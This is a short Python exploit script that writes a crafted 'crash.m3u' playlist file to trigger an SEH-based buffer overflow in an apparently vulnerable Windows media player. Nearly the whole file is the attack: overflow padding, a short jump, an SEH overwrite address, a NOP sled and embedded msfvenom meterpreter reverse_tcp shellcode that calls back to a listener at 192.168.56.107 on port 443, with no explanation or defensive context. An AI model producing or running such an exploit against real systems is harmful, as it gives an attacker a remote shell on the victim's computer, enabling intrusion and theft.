#!/usr/bin/python3

import sys
from struct import pack

def create_file(file_name,buffer):
    with open(file_name,"wb") as file:
        file.write(buffer)
    print(f"[+]Payload created as {file_name}")



# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=443 -b"\x00\x0a\x0d" -f py -v shellcode
#Payload size: 381 bytes
#Final size of py file: 2136 bytes
shellcode =  b""
shellcode += b"\xdb\xda\xd9\x74\x24\xf4\xbd\x78\xbb\xe2\xe0"
shellcode += b"\x5f\x31\xc9\xb1\x59\x31\x6f\x19\x83\xef\xfc"
shellcode += b"\x03\x6f\x15\x9a\x4e\x1e\x08\xd5\xb1\xdf\xc9"
shellcode += b"\x89\x38\x3a\xf8\x9b\x5f\x4e\xa9\x2b\x2b\x02"
shellcode += b"\x42\xc0\x79\xb7\xd1\xa4\x55\x86\x1a\x47\x11"
shellcode += b"\xa2\xc2\x66\x9d\x9f\x37\xe9\x61\xe2\x6b\xc9"
shellcode += b"\x58\x2d\x7e\x08\x9c\xfb\xf4\xe5\x70\x77\xa4"
shellcode += b"\xe9\x23\x0c\x0b\x35\xcd\xc2\x07\x05\xb5\x67"
shellcode += b"\xd7\xf1\x09\x69\x08\x72\xc9\x49\xa9\x57\xba"
shellcode += b"\x02\xe1\x4f\xbe\xdc\x86\x53\x89\x55\x52\x20"
shellcode += b"\x08\xbc\xaa\xc9\x3a\x80\x0c\xfa\x30\xac\x8e"
shellcode += b"\xc3\x73\x4c\xe5\x3f\x80\xf1\xfe\x84\xfa\x2d"
shellcode += b"\x8a\x1a\x5c\xa5\x2c\xfe\x5c\x6a\xaa\x75\x52"
shellcode += b"\xc7\xb8\xd1\x77\xd6\x6d\x6a\x83\x53\x90\xbc"
shellcode += b"\x05\x27\xb7\x18\x4d\xf3\xd6\x39\x2b\x52\xe6"
shellcode += b"\x59\x93\x0b\x42\x12\x36\x5d\xf2\xdb\xc8\x62"
shellcode += b"\xae\x4b\x04\xaf\x51\x8b\x02\xb8\x22\xb9\x8d"
shellcode += b"\x12\xad\xf1\x46\xbd\x2a\x80\x41\x3e\xe4\x2a"
shellcode += b"\x01\xc0\x05\x4a\x0b\x07\x51\x1a\x23\xae\xda"
shellcode += b"\xf1\xb3\x4f\x0f\x6f\xbe\xc7\x70\xc7\x86\x7c"
shellcode += b"\x19\x15\xf7\x83\x62\x90\x11\xd3\xc4\xf2\x8d"
shellcode += b"\x94\xb4\xb2\x7d\x7d\xdf\x3d\xa1\x9d\xe0\x94"
shellcode += b"\xca\x34\x0f\x40\xa2\xa0\xb6\xc9\x38\x50\x36"
shellcode += b"\xc4\x44\x52\xbc\xec\xb9\x1d\x35\x85\xa9\x4a"
shellcode += b"\x22\x65\x32\x8b\xc7\x65\x58\x8f\x41\x32\xf4"
shellcode += b"\x8d\xb4\x74\x5b\x6d\x93\x07\x9c\x91\x62\x31"
shellcode += b"\xd6\xa4\xf0\x7d\x80\xc8\x14\x7d\x50\x9f\x7e"
shellcode += b"\x7d\x38\x47\xdb\x2e\x5d\x88\xf6\x43\xce\x1d"
shellcode += b"\xf9\x35\xa2\xb6\x91\xbb\x9d\xf1\x3d\x44\xc8"
shellcode += b"\x81\x3a\xba\x8e\xad\xe2\xd2\x70\xee\x12\x22"
shellcode += b"\x1b\xee\x42\x4a\xd0\xc1\x6d\xba\x19\xc8\x25"
shellcode += b"\xd2\x90\x9d\x84\x43\xa4\xb7\x49\xdd\xa5\x34"
shellcode += b"\x52\xee\xdc\x35\x65\x0f\x21\x5c\x02\x10\x21"
shellcode += b"\x60\x34\x2d\xf7\x59\x42\x70\xcb\xdd\x5d\xc7"
shellcode += b"\x6e\x77\xf4\x27\x3c\x87\xdd"

buffer = b"\x41"*42000
#[*] Exact match at offset 1499
buffer += b"\x41"*1495
buffer += b"\x90\x90\xeb\x12"
buffer += pack("<L",0x10031659)         #seh
buffer += b"\x90"*24
buffer += shellcode
buffer += b"\x42"*25000


create_file("crash.m3u",buffer)
